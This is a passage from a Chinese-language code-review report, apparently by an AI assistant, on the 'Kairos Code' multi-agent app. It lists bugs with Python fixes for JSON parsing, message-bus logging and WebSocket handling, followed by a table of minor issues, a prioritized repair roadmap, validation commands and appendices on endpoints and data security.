- LLM 也常在 JSON 前后加解释文本："以下是审查结果：```json\n...\n```\n希望对您有帮助"
- 任意一种不匹配上面 `if/startswith` 的格式都会**走到 except，把整段 LLM 输出塞进 1 个 MINOR issue 的 description 字段**
- 用户看到的"审查报告"就是 1 个糊话 issue

**影响**：
- Code Review 引擎几乎不可信
- UI 上 Review 页的 issue 表格是糊的

**修复**：

```python
# kairos/review/engine.py
import json
import re
import logging
from typing import Optional, List, Dict

logger = logging.getLogger(__name__)

def _extract_json_array(text: str) -> Optional[List[dict]]:
    """多种策略提取 JSON 数组，容错 trailing comma。"""
    # 策略 1: ```json ... ``` 或 ``` ... ```
    m = re.search(r"```(?:json|JSON)?\s*(\[.*?\])\s*```", text, re.DOTALL)
    if m:
        cleaned = re.sub(r",\s*([\]\}])", r"\1", m.group(1))   # 去掉 trailing comma
        try:
            return json.loads(cleaned)
        except Exception:
            pass

    # 策略 2: 裸 JSON 数组（找第一个 [ 到最后一个 ]）
    m = re.search(r"(\[.*\])", text, re.DOTALL)
    if m:
        cleaned = re.sub(r",\s*([\]\}])", r"\1", m.group(1))
        try:
            return json.loads(cleaned)
        except Exception:
            pass

    return None


class ReviewEngine:
    async def review_file(self, file_path: str, code: str) -> FileReview:
        prompt = REVIEW_PROMPT.format(file_path=file_path, code=code[:8000])
        messages = [LLMMessage(role="user", content=prompt)]
        response = await self._llm.complete(messages)

        issues: List[ReviewIssue] = []
        issues_data = _extract_json_array(response.content)
        if issues_data is not None and isinstance(issues_data, list):
            for item in issues_data:
                if not isinstance(item, dict):
                    continue
                try:
                    issues.append(ReviewIssue(
                        category=item.get("category", "MINOR"),
                        file=item.get("file", file_path),
                        line=item.get("line", 0),
                        description=item.get("description", ""),
                        code_snippet=item.get("code_snippet", ""),
                        suggestion=item.get("suggestion", ""),
                    ))
                except Exception as e:
                    logger.warning("Bad review issue format: %s, item=%s", e, item)
        else:
            logger.warning(
                "Failed to parse review JSON for %s. LLM output: %s",
                file_path, response.content[:200],
            )
            # 失败时不糊弄，返回 0 issues + summary 标注
            issues = []

        critical = sum(1 for i in issues if i.category == "CRITICAL")
        major = sum(1 for i in issues if i.category == "MAJOR")
        minor = sum(1 for i in issues if i.category == "MINOR")
        score = max(0, 100 - critical * 20 - major * 10 - minor * 3)

        return FileReview(
            file_path=file_path,
            issues=issues,
            summary=f"Found {len(issues)} issues ({critical} critical, {major} major, {minor} minor)",
            score=score,
        )
```

失败时**记日志 + 返回空列表**，不要塞糊话 issue。

**优先级**：P2

---

#### B9.【Major】MessageBus listener 异常静默吞掉

**位置**：`kairos/core/message_bus.py:60-72`

```python
for listener in self._listeners:
    try:
        if asyncio.iscoroutinefunction(listener):
            await listener(message)
        else:
            listener(message)
    except Exception:
        pass   # ← 吞了
```

**影响**：
- WS 推送失败（比如 ws 客户端断连了）用户看不到
- 调试时不知道链路哪里断了
- 一致性问题：UI 上某条消息永远没显示

**修复**：

```python
# kairos/core/message_bus.py
import logging
logger = logging.getLogger(__name__)

class MessageBus:
    def __init__(self):
        ...
        self._log = logger

    async def publish(self, message: Message):
        # Store in history
        self._history.append(message)
        if len(self._history) > self._max_history:
            self._history = self._history[-self._max_history:]

        # Notify UI listeners
        for listener in self._listeners:
            try:
                if asyncio.iscoroutinefunction(listener):
                    await listener(message)
                else:
                    listener(message)
            except Exception:
                # 记录但不中断其他 listener
                self._log.exception(
                    "Listener %r raised while handling message topic=%s sender=%s",
                    listener, message.topic, message.sender,
                )

        # Route to subscribers
        ...
```

**优先级**：P2

---

#### B10.【Major】WebSocket 实现有问题

**位置**：`api/routes/websocket.py`

**问题**：
1. **`_last_msg_count` 是模块级全局变量**（line 9），多个 WS 客户端共享同一个计数器——A 客户端推送导致 B 客户端的 `_last_msg_count` 也跳了，**多端协作时会乱套**
2. **每秒 `orchestrator.refresh_all_agents()`**（line 44），每次遍历所有 agent 重建 Provider client：
   - `ModelRouter.get_provider_for_role` 注释说"Create fresh provider (no cache)"
   - 所以每秒给每个 agent 重建 `AsyncOpenAI`/`httpx.AsyncClient`
   - 资源浪费、可能产生连接泄漏
3. **每条消息**通过 `send_json` 同步推送（line 60-65），没有 fan-out / 限流
4. **无限循环**没设心跳，长时间无活动可能被代理切断

**影响**：
- 多人/多标签页打开会互相干扰
- 服务端资源消耗高于必要
- 长时间 idle 后 WS 静默断开，前端 `onclose` 才 3 秒后重连——但用户已经在 UI 上看到的"实时"其实已经死了

**修复**：

```python
# api/routes/websocket.py
import asyncio
import json
import logging
from typing import Dict
from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from api.deps import orchestrator

router = APIRouter()
log = logging.getLogger(__name__)


class WSClient:
    """每个 WS 客户端自己的状态。"""
    def __init__(self, ws: WebSocket):
        self.ws = ws
        self.last_seen_msg_ts = 0.0
        self.alive = True


# 全部客户端
_clients: Dict[str, WSClient] = {}


@router.websocket("/collaboration")
async def collaboration_ws(websocket: WebSocket):
    await websocket.accept()
    client_id = f"client_{id(websocket)}"
    client = WSClient(websocket)
    _clients[client_id] = client

    # 注册到 MessageBus
    async def listener(msg):
        if not client.alive:
            return
        try:
            await websocket.send_json({
                "type": "activity",
                "message": msg.to_dict(),
            })
        except Exception:
            client.alive = False
    orchestrator.message_bus.add_listener(listener)

    try:
        # 初始状态
        await websocket.send_json({
            "type": "init",
            "agents": orchestrator.get_all_agent_states(),
            "messages": [m.to_dict() for m in orchestrator.message_bus.get_history(limit=100)],
        })

        # 双向心跳 + 状态推送（30s 一次足够）
        while client.alive:
            try:
                # 30s 内没消息就 ping
                await asyncio.wait_for(websocket.receive_text(), timeout=30.0)
            except asyncio.TimeoutError:
                # 主动发 ping
                await websocket.send_json({"type": "ping"})
                continue
            except WebSocketDisconnect:
                break

            # 收到任意消息就推一次最新 agent 状态
            if client.alive:
                try:
                    await websocket.send_json({
                        "type": "agent_update",
                        "agents": orchestrator.get_all_agent_states(),
                    })
                except Exception:
                    break

    except WebSocketDisconnect:
        pass
    finally:
        client.alive = False
        orchestrator.message_bus.remove_listener(listener)
        _clients.pop(client_id, None)


async def broadcast(message: dict):
    """广播给所有活着客户端。"""
    dead = []
    for cid, client in _clients.items():
        if not client.alive:
            dead.append(cid)
            continue
        try:
            await client.ws.send_json(message)
        except Exception:
            client.alive = False
            dead.append(cid)
    for cid in dead:
        _clients.pop(cid, None)
```

主要改动：
- 每个客户端独立的 `WSClient`，不再共享 `_last_msg_count`
- 不再每秒 `refresh_all_agents()`，改成事件驱动（MessageBus listener 收到新消息时推送）
- 加 ping/pong 心跳
- 死连接检测和清理

**优先级**：P2

---

#### B11.【Major】`chat_with_agent` 截断响应到 200 字符

**位置**：`kairos/core/orchestrator.py:175-181`

```python
# Publish agent response to bus
await self.message_bus.publish(Message(
    sender=agent_id,
    topic="chat",
    content=response[:200],   # ← 自己截的
    msg_type="text",
))
```

**问题**：
- 完整响应其实有，但发到 bus 时**自己截断到 200 字符**
- WS 推给前端的就是 200 字
- UI 上 Collaboration 面板 `web/src/pages/Collaboration.tsx:222` `msg.content.slice(0, 300)` 又截一刀
- 用户看到"agent 写了一大段被砍没了"以为是 UI bug

**修复**：

```python
# kairos/core/orchestrator.py:175-181
await self.message_bus.publish(Message(
    sender=agent_id,
    topic="chat",
    content=response,    # ← 完整发，让前端决定怎么展示
    msg_type="text",
))
```

UI 端在 `Collaboration.tsx:222` 已经做了 `slice(0, 300)`，加 tooltip 显示完整内容即可。

**优先级**：P3（顺手修）

---

### 3.3 Minor（13 个）

| # | 位置 | 问题 | 修复 |
|---|------|------|------|
| M1 | `data/settings.json` | 存明文 API key，无加密 | 用 `cryptography.fernet` 加密 + 系统 keystore/master password；或在设置 UI 加"显示/隐藏"切换，并提示风险 |
| M2 | `kairos/llm/providers/anthropic_provider.py:91` | `stream()` 每次循环里 `import json` | 提到函数顶部 |
| M3 | `kairos/llm/providers/anthropic_provider.py:21` | `httpx.AsyncClient` 没设 `limits=httpx.Limits(max_keepalive_connections=20, max_connections=50)` | 加 limits |
| M4 | `kairos/core/orchestrator.py:101` | `refresh_all_agents` 异常 `except Exception: pass` | `logger.exception` |
| M5 | `api/app.py:25` | CORS `allow_origins=["*"]` + `allow_credentials=True`（违反 spec） | 限白名单 `allow_origins=["http://localhost:3000"]` |
| M6 | `kairos/llm/model_router.py:69` | `get_provider_for_role` 每次都 `self._load_custom_models()`，每次读盘 | 缓存 + TTL（5s）或只在 `assign_role_model` 时刷新 |
| M7 | `watchdog.bat:11` | 用 `wmic` 找进程，Win11 24H2 已弃用 wmic | 改用 PowerShell `Get-CimInstance Win32_Process` |
| M8 | `web/src/pages/Collaboration.tsx:62-65` | 每 2s 轮询 + WS 推送同时跑 | 只保留 WS，轮询只在 WS 断线时启用 |
| M9 | `web/src/types/index.ts:26` | `Message.content: any` | 改成 `string \| object`，渲染前判断 |
| M10 | `kairos/agents/base.py:18` | `AgentStatus.WAITING` 全代码库没人用 | 删或用上（比如 chat 等响应时设为 WAITING） |
| M11 | `kairos/core/orchestrator.py:24,65` | `Project.workspace` 和 `work_dir` 割裂——`workspace = workspace_base/project_id` 生成目录，**但 work_dir 字段被记到 project 上却全代码库没人用它**（因为 tools 没接入） | B1 修好后用 work_dir，并删掉 workspace 自动生成；或保留为兼容字段 |
| M12 | `start.vbs:8` | `cd /d` 在 VBS 双引号转义里容易出错 | 改用 `WScript.Shell.CurrentDirectory = scriptDir` 后再 `Run` |
| M13 | `kairos/llm/model_router.py:182` | `list_models()` 返回的 5 个 yaml 预设（`default/creative/precise/fast/local`）用户大概率看不懂含义 | yaml 预设加 `label` / `description` 字段，前端展示 `id + description` |

---

## 4. 设计层面问题（非具体 bug）

| # | 问题 | 影响 |
|---|------|------|
| D1 | 没有 Action 抽象层 | Role 只能"说一句"，不能"产出一个结构化产物"（如 PRD.md、API.yaml、Dockerfile）。MetaGPT 的核心是 Action 之间的输入输出接力，Kairos 没有 |
| D2 | MessageBus 没有 trigger 机制 | pub/sub 只发到 listener/queue，**没有"消息 X 来了就触发 agent Y 跑起来"**。MetaGPT 的灵魂是 trigger-by-subscribe |
| D3 | 8 个 role 全是"独立 chatbot" | 没有 shared state、没有 memory sharing、没有 project-level context pool |
| D4 | tools 规划了但没接入 | `kairos/tools/` 像早期留下的脚手架，意图是清楚的但没合龙 |
| D5 | 审查引擎（Review）和 Agent 体系没打通 | `/api/review/project` 走 `ReviewEngine`（独立 LLM 调用），**没让 CodeReviewer Agent 真的去审代码** |
| D6 | 没有任务依赖图 | 8 个 agent 应该是图（DAG）执行，目前是"列表"，没有上下游约束（"Architect 出完才能 Backend 动手"） |
| D7 | 没有 artifact 存储 | agent 输出是裸字符串，PRD/架构文档/代码文件没地方落盘（tools 没接就是原因） |
| D8 | 没有"成本/配额"控制 | 用户跑 8 个 agent × N 轮对话 × 每次带 50k tokens，很容易单次跑出几十块；没有 max_budget / max_turns / cost_estimation 机制 |

---

## 5. 修复优先级 Roadmap

| 优先级 | 改什么 | 解决 B# | 预计工时 |
|-------|-------|---------|---------|
| **P0** | tools 接入 agent 主循环（Provider 加 `tools` 参数、`_process_response` 解析 tool_calls、循环到 LLM 决定停止） | B1, B11, M11 | 4-6h |
| **P0** | TerminalTool 沙箱（cwd 锁定 + deny 危险命令） | B3 | 1h |
| **P1** | Orchestrator 真做多 agent 派发（Team Leader 输出结构化 JSON → asyncio.gather 分发） | B6, D2 | 2-3h |
| **P1** | 持久化（SQLite，Project/Messages/Memory 三张表） | B4 | 3-4h |
| **P1** | memory token 计数 + 自动滚动 | B7 | 1-2h |
| **P1** | agents_config.yaml 真读真用 | B2, D1 | 1h |
| **P2** | ReviewEngine JSON 解析健壮化 | B8 | 0.5h |
| **P2** | WebSocket per-client state + provider client 缓存 | B10 | 2h |
| **P2** | MessageBus listener 异常 logging | B9 | 0.2h |
| **P2** | `chat_with_agent` 不截断响应 | B11 | 0.1h |
| **P3** | project_id 改必填、orchestrator 加写锁 | B5 | 0.5h |
| **P3** | 其余 Minor 13 个 | M1–M13 | 1-2h |

**总工时估算**：**18–25 小时**（如果一个人串行做，2-3 个工作日）

**推荐执行顺序**（P0 → P3，按依赖关系排）：
1. **P0-1**：B1 tools 接入（含 Provider 改造）— 4-6h
2. **P0-2**：B3 Terminal 沙箱 — 1h  
3. **P1-3**：B6 Orchestrator 派发 — 2-3h（依赖 B1，因为派发的子任务会调 tools）
4. **P1-4**：B2 yaml 真读 — 1h
5. **P1-5**：B4 持久化 — 3-4h
6. **P1-6**：B7 memory token — 1-2h
7. **P2-7**：B8 Review 健壮化 — 0.5h
8. **P2-8**：B10 WS 改造 — 2h
9. **P2-9**：B9 listener logging — 0.2h
10. **P2-10**：B11 不截断 — 0.1h
11. **P3-11**：B5 project_id 必填 — 0.5h
12. **P3-12**：M1–M13 — 1-2h

---

## 6. 验证结果

```powershell
# 1. 全部 Python 文件语法检查
PS> python -c "import ast, pathlib; [ast.parse(p.read_text(encoding='utf-8')) for p in pathlib.Path('kairos').rglob('*.py')]; [ast.parse(p.read_text(encoding='utf-8')) for p in pathlib.Path('api').rglob('*.py')]; print('OK')"
OK

# 2. 全部 Python 模块导入检查
PS> python -c "from kairos.agents.base import KairosAgent; \
               from kairos.core.orchestrator import Orchestrator; \
               from kairos.llm.model_router import ModelRouter; \
               from kairos.review.engine import ReviewEngine; \
               from api.app import app; \
               print('All imports OK')"
All imports OK
```

**代码语法和导入都正常**——**问题不在语法层，全在架构/集成层**。

---

## 7. 关键文件速查（修复时直接看这里）

| 想改什么 | 直接看 |
|---------|--------|
| 让 agent 能用工具 | `kairos/agents/base.py`（`_process_response`、`run`）、`kairos/llm/providers/openai_provider.py`（`complete`）、`kairos/llm/providers/anthropic_provider.py`（`complete`） |
| 真做多 agent 协作 | `kairos/core/orchestrator.py`（`start_project`、`_create_team`） |
| 持久化 | 新建 `kairos/core/persistence.py`，改 `kairos/core/orchestrator.py` 和 `kairos/core/message_bus.py` |
| TerminalTool 沙箱 | `kairos/tools/terminal.py` |
| 让 yaml 生效 | `kairos/agents/roles/*.py`（把常量改为 `__init__` 参数）、`kairos/core/orchestrator.py`（`_create_team` 读 yaml） |
| WebSocket 修 | `api/routes/websocket.py` |
| Review 解析 | `kairos/review/engine.py:106-128` |
| 启动脚本 | `start.bat`、`start.vbs`、`watchdog.bat` |
| memory token | `kairos/agents/base.py:79-82` |
| MessageBus listener logging | `kairos/core/message_bus.py:60-72` |

---

## 8. 一句话总结

> **Kairos Code 的架构骨架画得对、文件组织清晰、LLM 抽象层做得不错，但"多 agent 协作"目前是空壳——tools 没接入、Orchestrator 不会真派发、状态不持久化、Terminal 无沙箱。优先把 P0 的 tools 接入 + 沙箱做掉，整个系统才能从"8 个独立 chatbot"变成"能干活的多 agent 团队"。**

---

## 附录 A：API 端点现状

| 端点 | 方法 | 状态 | 备注 |
|------|------|------|------|
| `/api/health` | GET | ✅ | OK |
| `/api/dashboard` | GET | ✅ | OK |
| `/api/projects` | GET/POST | ✅ | 列表/创建 |
| `/api/projects/{id}` | GET/DELETE | ✅ | OK |
| `/api/projects/{id}/start` | POST | ⚠️ | 只调 Team Leader，其他 agent 不触发（B6） |
| `/api/projects/{id}/messages` | GET | ✅ | 内存历史，重启丢（B4） |
| `/api/projects/{id}/requirements` | POST | ✅ | 自动保存 |
| `/api/agents` | GET | ✅ | 列表/状态 |
| `/api/agents/{id}` | GET | ✅ | 单个状态 |
| `/api/agents/chat` | POST | ⚠️ | project_id 路由错乱（B5） + 响应截断（B11） |
| `/api/agents/task` | POST | ⚠️ | 同上 + 任务不持久（B4） |
| `/api/agents/refresh` | POST | ✅ | 刷新模型配置 |
| `/api/review/project` | POST | ⚠️ | JSON 解析脆弱（B8） |
| `/api/review/file` | POST | ⚠️ | 同上 |
| `/api/config/models` | GET | ✅ | yaml 预设列表 |
| `/api/config/models/assign` | POST | ✅ | 角色→模型映射 |
| `/api/config/providers` | GET | ✅ | 列出已注册 provider |
| `/api/config/settings` | GET/POST | ✅ | API key + custom_models |
| `/api/config/models/deepseek` | GET | ✅ | DeepSeek 模型列表 |
| `/api/config/models/custom/fetch` | POST | ✅ | 自定义 OpenAI/Anthropic 兼容服务拉模型 |
| `/api/config/test-provider` | POST | ✅ | 测试连通性 |
| `/ws/collaboration` | WS | ⚠️ | 共享 _last_msg_count（B10） |
| `/ws/agent/{agent_id}` | WS | ⚠️ | 单 agent 聊天 |

## 附录 B：安全 / 数据清单

| 项目 | 存储位置 | 加密 | 风险 |
|------|---------|------|------|
| API keys | `data/settings.json` | ❌ 明文 | 任何能读文件系统的人都能拿到 |
| LLM 调用日志 | 无 | — | 没有持久化，重启丢 |
| Agent memory | 内存 | — | 重启丢 |
| 项目元数据 | 内存 | — | 重启丢 |
| 消息历史 | 内存 | — | 重启丢 |
| 审计日志 | 无 | — | 完全没有 |

## 附录 C：性能 / 资源基线

| 操作 | 资源消耗 | 备注 |
|------|---------|------|
| `get_provider_for_role` | 每次读 `data/settings.json` | M6 |
| 启动 | 1 个 uvicorn + 1 个 vite | 正常 |
| WebSocket 推送频率 | 1Hz 推 agent 状态 | B10，过度 |
| 单轮 LLM 调用 | system_prompt + memory + context | 无 token 计数，B7 |
| 文件 review | 50 文件 × 8000 chars × 1 LLM 调用 | review 时长 = 文件数 × 单次 LLM 延迟 |

---

**报告完。**  按 P0 顺序直接动手改？第一步就是 B1+B3——接 tools + 加沙箱，做完系统就能真跑端到端。
